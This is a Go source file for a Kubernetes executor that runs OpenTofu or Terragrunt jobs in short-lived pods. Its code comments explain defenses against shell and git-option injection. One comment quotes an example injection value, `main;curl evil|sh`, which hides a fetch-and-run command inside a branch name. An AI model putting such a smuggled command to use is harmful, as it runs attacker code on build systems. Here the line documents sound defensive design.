package executor

import (
	"context"
	"fmt"
	"log/slog"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/nanohype/portal/internal/conv"

	corev1 "k8s.io/api/core/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/watch"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

// KubernetesExecutor runs OpenTofu in ephemeral K8s pods.
type KubernetesExecutor struct {
	client      kubernetes.Interface
	namespace   string
	image       string
	imagePrefix string
}

type KubernetesExecutorConfig struct {
	Namespace   string // K8s namespace for executor pods
	Image       string // Base executor image (e.g. "portal-executor:tofu-1.11")
	ImagePrefix string // Image prefix for per-version images (e.g. "portal-executor")
}

func NewKubernetesExecutor(cfg KubernetesExecutorConfig) (*KubernetesExecutor, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return nil, fmt.Errorf("failed to get in-cluster config: %w", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return nil, fmt.Errorf("failed to create kubernetes client: %w", err)
	}

	ns := cfg.Namespace
	if ns == "" {
		ns = "portal"
	}
	image := cfg.Image
	if image == "" {
		image = "portal-executor:tofu-1.11"
	}

	imagePrefix := cfg.ImagePrefix
	if imagePrefix == "" {
		imagePrefix = "portal-executor"
	}

	return &KubernetesExecutor{
		client:      clientset,
		namespace:   ns,
		image:       image,
		imagePrefix: imagePrefix,
	}, nil
}

// commitMarker prefixes the one line the run script prints with the commit it
// checked out, so the worker can read it back out of the pod log.
const commitMarker = "===PORTAL_COMMIT==="

// commitMarkerRe matches that line anywhere in the log. The commit is reported
// right after the clone rather than at the end, so unlike the state and plan
// markers this one is cut out of the middle of the output rather than
// truncating everything after it.
var commitMarkerRe = regexp.MustCompile(`(?m)^` + commitMarker + `([0-9a-fA-F]{7,64})\r?\n?`)

func (e *KubernetesExecutor) Execute(ctx context.Context, params ExecuteParams) (*ExecuteResult, error) {
	logger := slog.With("run_id", params.RunID, "operation", params.Operation)

	// A pin that is not an object id never reaches git. The value is referenced
	// as a quoted shell variable so it cannot be read as shell, but git itself
	// would still read a leading-dash value as an option, and a pin portal
	// cannot resolve has to stop the run rather than degrade to branch head.
	if params.CommitSHA != "" && !IsCommitSHA(params.CommitSHA) {
		return nil, fmt.Errorf("refusing to check out %q: not a git commit id", params.CommitSHA)
	}

	podName := fmt.Sprintf("portal-run-%s", params.RunID)

	// Build OpenTofu command script
	script := e.buildScript(params)

	payload := buildRunPayload(script, podName, params)

	labels := map[string]string{
		"app.kubernetes.io/managed-by": "portal",
		"portal/run-id":                params.RunID,
	}

	cm := &corev1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{Name: podName, Namespace: e.namespace, Labels: labels},
		Data:       payload.public,
	}
	if len(payload.archive) > 0 {
		cm.BinaryData = map[string][]byte{archiveKey: payload.archive}
	}

	if err := e.createConfigMap(ctx, cm); err != nil {
		return nil, fmt.Errorf("failed to create configmap: %w", err)
	}
	// Cleanup must survive job-ctx cancellation (SIGTERM mid-apply): otherwise
	// the pod keeps tofu-applying unobserved and a retry hits AlreadyExists on
	// the deterministic ConfigMap name.
	defer e.deleteResource(ctx, "configmap", podName)

	if len(payload.sensitive) > 0 {
		secret := &corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: podName, Namespace: e.namespace, Labels: labels},
			Type:       corev1.SecretTypeOpaque,
			Data:       payload.sensitive,
		}
		if err := e.createSecret(ctx, secret); err != nil {
			return nil, fmt.Errorf("failed to create secret: %w", err)
		}
		defer e.deleteResource(ctx, "secret", podName)
	}
	defer e.deleteResource(ctx, "pod", podName)

	// Create Pod
	pod := e.buildPod(podName, params, payload)

	_, err := e.client.CoreV1().Pods(e.namespace).Create(ctx, pod, metav1.CreateOptions{})
	if err != nil {
		return nil, fmt.Errorf("failed to create pod: %w", err)
	}

	logger.Info("executor pod created", "pod", podName)
	params.LogCallback([]byte(fmt.Sprintf("Executor pod %s created, waiting for start...\r\n", podName)))

	// Wait for pod to be running
	if err := e.waitForPodPhase(ctx, podName, corev1.PodRunning, 5*time.Minute); err != nil {
		return nil, fmt.Errorf("pod failed to start: %w", err)
	}

	// Stream logs. The framed payloads come back out-of-band — they are not in
	// `output` and were never handed to the log callback (framing.go).
	output, captured, err := e.streamPodLogs(ctx, podName, params.LogCallback)
	if err != nil {
		return nil, fmt.Errorf("failed to stream logs: %w", err)
	}

	// Wait for pod to complete
	if err := e.waitForPodPhase(ctx, podName, corev1.PodSucceeded, 30*time.Minute); err != nil {
		return nil, fmt.Errorf("pod failed: %w", err)
	}

	// Parse result
	result := resultFromCaptured(output, captured)

	// Lift the executed commit out of the log and drop the marker line from what
	// the user reads.
	if m := commitMarkerRe.FindStringSubmatch(output); m != nil {
		result.CommitSHA = m[1]
		output = commitMarkerRe.ReplaceAllString(output, "")
		result.Output = output
	}

	planSummaryRe := regexp.MustCompile(`Plan: (\d+) to add, (\d+) to change, (\d+) to destroy`)
	matches := planSummaryRe.FindStringSubmatch(output)
	if len(matches) == 4 {
		added, _ := strconv.Atoi(matches[1])
		changed, _ := strconv.Atoi(matches[2])
		deleted, _ := strconv.Atoi(matches[3])
		result.ResourcesAdded = conv.Int32(added)
		result.ResourcesChanged = conv.Int32(changed)
		result.ResourcesDeleted = conv.Int32(deleted)
	}

	logger.Info("executor pod completed", "pod", podName)
	return result, nil
}

func (e *KubernetesExecutor) buildScript(params ExecuteParams) string {
	var sb strings.Builder

	sb.WriteString("#!/bin/sh\nset -e\n\n")

	// Get source: clone repo or extract uploaded archive.
	//
	// RepoURL/RepoBranch/WorkingDir are referenced as quoted shell variables
	// (PORTAL_* env vars set on the container), never interpolated into the
	// script text — so a value like `main;curl evil|sh` is passed verbatim to
	// git/cd instead of being parsed as shell. The `--branch=` form and the `--`
	// separator also stop a leading-dash value from being read as a git option.
	if params.Source == "upload" {
		sb.WriteString("echo 'Extracting uploaded configuration...'\n")
		sb.WriteString("cd /work\n")
		sb.WriteString("tar xzf /config/source.tar.gz\n")
		sb.WriteString("cd \"/work/$PORTAL_WORKING_DIR\"\n\n")
	} else {
		sb.WriteString("echo \"Cloning $PORTAL_REPO_URL (branch: $PORTAL_REPO_BRANCH)...\"\n")
		sb.WriteString("git clone --depth 1 --branch=\"$PORTAL_REPO_BRANCH\" -- \"$PORTAL_REPO_URL\" /work\n")
		// Move onto the pinned commit when the run carries one. The shallow
		// clone almost never contains it — the branch has moved since the plan —
		// so fetch that one object, falling back to the branch's full history
		// for a server that refuses a by-id fetch. `set -e` makes a failed
		// checkout fail the pod, which is the point: a commit the branch no
		// longer contains must stop the run, not silently become branch head.
		sb.WriteString("if [ -n \"$PORTAL_COMMIT_SHA\" ]; then\n")
		sb.WriteString("  echo \"Checking out pinned commit $PORTAL_COMMIT_SHA...\"\n")
		sb.WriteString("  git -C /work fetch --depth 1 origin \"$PORTAL_COMMIT_SHA\" || git -C /work fetch --unshallow origin\n")
		sb.WriteString("  git -C /work checkout --detach \"$PORTAL_COMMIT_SHA\"\n")
		sb.WriteString("fi\n")
		// Report the commit actually executed on one line, so the worker can pin
		// the run to it and a later apply of the same run gets this tree.
		sb.WriteString("echo \"" + commitMarker + "$(git -C /work rev-parse HEAD)\"\n")
		sb.WriteString("cd \"/work/$PORTAL_WORKING_DIR\"\n\n")
	}

	// Detect wrapper. terragrunt.hcl at the leaf → terragrunt drives the run
	// (it walks parent dirs and renders terraform itself); otherwise tofu does.
	sb.WriteString("if [ -f terragrunt.hcl ]; then\n")
	sb.WriteString("  BIN=terragrunt\n")
	sb.WriteString("  echo 'Detected terragrunt.hcl — using terragrunt wrapper.'\n")
	sb.WriteString("  echo '[portal] TG_NON_INTERACTIVE=true — terragrunt prompts auto-confirmed.'\n")
	sb.WriteString("  echo '[portal] TG_BACKEND_BOOTSTRAP=true — remote state bucket will be auto-created if missing.'\n")
	sb.WriteString("else\n")
	sb.WriteString("  BIN=tofu\n")
	sb.WriteString("fi\n\n")

	// Copy tfvars if present. Skipped in terragrunt mode — terragrunt's
	// `inputs = {}` block is the source of truth.
	sb.WriteString("if [ \"$BIN\" = \"tofu\" ] && [ -f /config/portal.auto.tfvars ]; then cp /config/portal.auto.tfvars .; fi\n\n")

	// Restore previous state if present. Skipped in terragrunt mode —
	// state lives in the remote backend; a local file just confuses init.
	sb.WriteString("if [ \"$BIN\" = \"tofu\" ] && [ -f /config/terraform.tfstate ]; then\n")
	sb.WriteString("  cp /config/terraform.tfstate .\n")
	sb.WriteString("  echo 'Restored previous state file.'\n")
	sb.WriteString("fi\n\n")

	// Copy encryption override if present. Skipped in terragrunt mode —
	// terragrunt's source copy pulls leaf .tf files into the rendered cache,
	// so the override would silently encrypt the user's remote state with
	// portal's per-workspace passphrase and break `dependency` blocks across
	// sibling workspaces.
	sb.WriteString("if [ \"$BIN\" = \"tofu\" ] && [ -f /config/portal_encryption_override.tf ]; then\n")
	sb.WriteString("  cp /config/portal_encryption_override.tf .\n")
	sb.WriteString("  echo 'State encryption enabled (AES-GCM).'\n")
	sb.WriteString("fi\n\n")

	// Init
	sb.WriteString("echo \"\\$ $BIN init\"\n")
	sb.WriteString("$BIN init -no-color\n\n")

	// Validate
	sb.WriteString("echo \"\\$ $BIN validate\"\n")
	sb.WriteString("$BIN validate -no-color\n\n")

	// Operation
	sb.WriteString("if [ -f portal.auto.tfvars ]; then VAR_FILE='-var-file=portal.auto.tfvars'; fi\n\n")

	switch params.Operation {
	case "test":
		sb.WriteString("echo \"\\$ $BIN output -json\"\n")
		sb.WriteString("$BIN output -json > outputs.json 2>/dev/null || echo \"Warning: $BIN output failed (continuing anyway)\"\n\n")
		sb.WriteString("if [ ! -f smoke-test.sh ]; then\n")
		sb.WriteString("  echo 'smoke-test.sh not found in working directory'\n")
		sb.WriteString("  exit 1\n")
		sb.WriteString("fi\n")
		sb.WriteString("chmod +x smoke-test.sh\n")
		sb.WriteString("echo '$ ./smoke-test.sh'\n")
		sb.WriteString("./smoke-test.sh\n")
	case "plan":
		sb.WriteString("echo \"\\$ $BIN plan\"\n")
		// -detailed-exitcode: 0=no changes, 1=error, 2=changes detected
		// Capture exit code explicitly — only fail on exit 1 (error)
		sb.WriteString("set +e\n")
		sb.WriteString("$BIN plan -no-color -detailed-exitcode -out=planfile $VAR_FILE\n")
		sb.WriteString("PLAN_EXIT=$?\n")
		sb.WriteString("set -e\n")
		sb.WriteString("if [ \"$PLAN_EXIT\" -eq 1 ]; then echo 'Plan failed with errors'; exit 1; fi\n")
		sb.WriteString("\n# JSON plan, framed — see framing.go.\n")
		sb.WriteString("if [ -f planfile ]; then\n")
		sb.WriteString(frameFor(framedPlanJSON).open())
		sb.WriteString("$BIN show -json planfile\n")
		sb.WriteString(frameFor(framedPlanJSON).close())
		sb.WriteString("fi\n")
	case "apply":
		sb.WriteString("echo \"\\$ $BIN apply\"\n")
		sb.WriteString("$BIN apply -no-color -auto-approve $VAR_FILE\n")
		sb.WriteString(captureState())
	case "destroy":
		sb.WriteString("echo \"\\$ $BIN destroy\"\n")
		sb.WriteString("$BIN destroy -no-color -auto-approve $VAR_FILE\n")
		sb.WriteString(captureState())
	}

	return sb.String()
}

// captureState renders the tail apply and destroy share: the raw state file the
// next run is restored from, and the decrypted state the State tab browses.
//
// Both are framed, so neither reaches the run log. They are also the reason the
// framing exists at all — this is the tofu output that carries every generated
// password and provider credential the workspace holds.
func captureState() string {
	var sb strings.Builder

	sb.WriteString("\n# Raw state (may be encrypted) — restored onto the next run.\n")
	sb.WriteString("if [ -f terraform.tfstate ]; then\n")
	sb.WriteString(frameFor(framedStateFile).open())
	sb.WriteString("cat terraform.tfstate\n")
	sb.WriteString(frameFor(framedStateFile).close())
	sb.WriteString("fi\n")

	sb.WriteString("# Decrypted state — backs resource browsing.\n")
	sb.WriteString(frameFor(framedStateJSON).open())
	sb.WriteString("$BIN state pull\n")
	sb.WriteString(frameFor(framedStateJSON).close())

	return sb.String()
}

// resolveImage returns an image tag for the given tofu version.
// If a version is specified, it builds "{imagePrefix}:tofu-{version}";
// otherwise it falls back to the default image.
func (e *KubernetesExecutor) resolveImage(tofuVersion string) string {
	if tofuVersion != "" {
		return fmt.Sprintf("%s:tofu-%s", e.imagePrefix, tofuVersion)
	}
	return e.image
}

func (e *KubernetesExecutor) buildPod(name string, params ExecuteParams, payload runPayload) *corev1.Pod {
	volumes := []corev1.Volume{
		payload.volume(name),
		{
			Name: "work",
			VolumeSource: corev1.VolumeSource{
				EmptyDir: &corev1.EmptyDirVolumeSource{},
			},
		},
	}

	volumeMounts := []corev1.VolumeMount{
		{Name: "config", MountPath: "/config", ReadOnly: true},
		{Name: "work", MountPath: "/work"},
	}

	// Cap wall-clock so a stranded pod (worker killed before deferred delete)
	// cannot tofu-apply forever. 30m covers large apply; cleanup still preferred.
	activeDeadline := int64(30 * 60)

	return &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: e.namespace,
			Labels: map[string]string{
				"app.kubernetes.io/managed-by": "portal",
				"app.kubernetes.io/component":  "executor",
				"portal/run-id":                params.RunID,
				"portal/workspace-id":          params.WorkspaceID,
				"portal/operation":             params.Operation,
			},
		},
		Spec: corev1.PodSpec{
			RestartPolicy:         corev1.RestartPolicyNever,
			ActiveDeadlineSeconds: &activeDeadline,
			Containers: []corev1.Container{
				{
					Name:         "tofu",
					Image:        e.resolveImage(params.TofuVersion),
					Command:      []string{"/bin/sh", "/config/run.sh"},
					Env:          payload.env,
					VolumeMounts: volumeMounts,
					Resources: corev1.ResourceRequirements{
						Requests: corev1.ResourceList{
							corev1.ResourceCPU:    resource.MustParse("250m"),
							corev1.ResourceMemory: resource.MustParse("256Mi"),
						},
						Limits: corev1.ResourceList{
							corev1.ResourceCPU:    resource.MustParse("1"),
							corev1.ResourceMemory: resource.MustParse("1Gi"),
						},
					},
				},
			},
			Volumes:                       volumes,
			AutomountServiceAccountToken:  boolPtr(false),
			TerminationGracePeriodSeconds: int64Ptr(30),
		},
	}
}

// createConfigMap creates the run ConfigMap, replacing a leftover from a prior
// cancelled run of the same deterministic name (AlreadyExists).
func (e *KubernetesExecutor) createConfigMap(ctx context.Context, cm *corev1.ConfigMap) error {
	_, err := e.client.CoreV1().ConfigMaps(e.namespace).Create(ctx, cm, metav1.CreateOptions{})
	if err == nil {
		return nil
	}
	if !apierrors.IsAlreadyExists(err) {
		return err
	}
	// Detached delete: the leftover may be from a cancelled job whose cleanup
	// deferred with a cancelled ctx and never ran.
	cleanupCtx, cancel := context.WithTimeout(context.WithoutCancel(ctx), 15*time.Second)
	defer cancel()
	_ = e.client.CoreV1().ConfigMaps(e.namespace).Delete(cleanupCtx, cm.Name, metav1.DeleteOptions{})
	_, err = e.client.CoreV1().ConfigMaps(e.namespace).Create(ctx, cm, metav1.CreateOptions{})
	return err
}

// createSecret creates the run Secret, replacing a leftover from a prior
// cancelled run of the same deterministic name. Mirrors createConfigMap — and
// matters more here, since what a leftover holds is the previous run's
// cleartext variables rather than its script.
func (e *KubernetesExecutor) createSecret(ctx context.Context, secret *corev1.Secret) error {
	_, err := e.client.CoreV1().Secrets(e.namespace).Create(ctx, secret, metav1.CreateOptions{})
	if err == nil {
		return nil
	}
	if !apierrors.IsAlreadyExists(err) {
		return err
	}
	cleanupCtx, cancel := context.WithTimeout(context.WithoutCancel(ctx), 15*time.Second)
	defer cancel()
	_ = e.client.CoreV1().Secrets(e.namespace).Delete(cleanupCtx, secret.Name, metav1.DeleteOptions{})
	_, err = e.client.CoreV1().Secrets(e.namespace).Create(ctx, secret, metav1.CreateOptions{})
	return err
}

// deleteResource removes a pod, ConfigMap or Secret using a context that
// survives the job deadline so SIGTERM mid-Execute still cleans up.
func (e *KubernetesExecutor) deleteResource(ctx context.Context, kind, name string) {
	cleanupCtx, cancel := context.WithTimeout(context.WithoutCancel(ctx), 15*time.Second)
	defer cancel()
	var err error
	switch kind {
	case "pod":
		err = e.client.CoreV1().Pods(e.namespace).Delete(cleanupCtx, name, metav1.DeleteOptions{})
	case "configmap":
		err = e.client.CoreV1().ConfigMaps(e.namespace).Delete(cleanupCtx, name, metav1.DeleteOptions{})
	case "secret":
		err = e.client.CoreV1().Secrets(e.namespace).Delete(cleanupCtx, name, metav1.DeleteOptions{})
	}
	if err != nil && !apierrors.IsNotFound(err) {
		slog.Warn("executor cleanup failed", "kind", kind, "name", name, "error", err)
	}
}

func (e *KubernetesExecutor) waitForPodPhase(ctx context.Context, podName string, phase corev1.PodPhase, timeout time.Duration) error {
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	pod, err := e.client.CoreV1().Pods(e.namespace).Get(ctx, podName, metav1.GetOptions{})
	if err != nil {
		return err
	}
	if pod.Status.Phase == phase {
		return nil
	}
	if pod.Status.Phase == corev1.PodFailed {
		return fmt.Errorf("pod failed")
	}

	watcher, err := e.client.CoreV1().Pods(e.namespace).Watch(ctx, metav1.ListOptions{
		FieldSelector: fmt.Sprintf("metadata.name=%s", podName),
	})
	if err != nil {
		return err
	}
	defer watcher.Stop()

	for {
		select {
		case <-ctx.Done():
			return fmt.Errorf("timeout waiting for pod phase %s", phase)
		case event, ok := <-watcher.ResultChan():
			if !ok {
				return fmt.Errorf("watch channel closed")
			}
			if event.Type == watch.Deleted {
				return fmt.Errorf("pod was deleted")
			}
			pod, ok := event.Object.(*corev1.Pod)
			if !ok {
				continue
			}
			if pod.Status.Phase == phase {
				return nil
			}
			if pod.Status.Phase == corev1.PodFailed {
				return fmt.Errorf("pod failed")
			}
			if phase == corev1.PodRunning && pod.Status.Phase == corev1.PodSucceeded {
				return nil
			}
		}
	}
}

// streamPodLogs follows the run pod's log, forwarding what the user is meant to
// read to logCallback and demultiplexing the framed payloads out of it.
//
// The framed material is returned separately and never passed to logCallback —
// see framing.go for why that separation is the whole point of the frames.
func (e *KubernetesExecutor) streamPodLogs(ctx context.Context, podName string, logCallback func([]byte)) (string, map[framed][]byte, error) {
	req := e.client.CoreV1().Pods(e.namespace).GetLogs(podName, &corev1.PodLogOptions{
		Follow: true,
	})

	stream, err := req.Stream(ctx)
	if err != nil {
		return "", nil, err
	}
	defer stream.Close()

	return demuxFramed(stream, logCallback)
}

func int32Ptr(i int32) *int32 { return &i }
func int64Ptr(i int64) *int64 { return &i }
func boolPtr(b bool) *bool    { return &b }
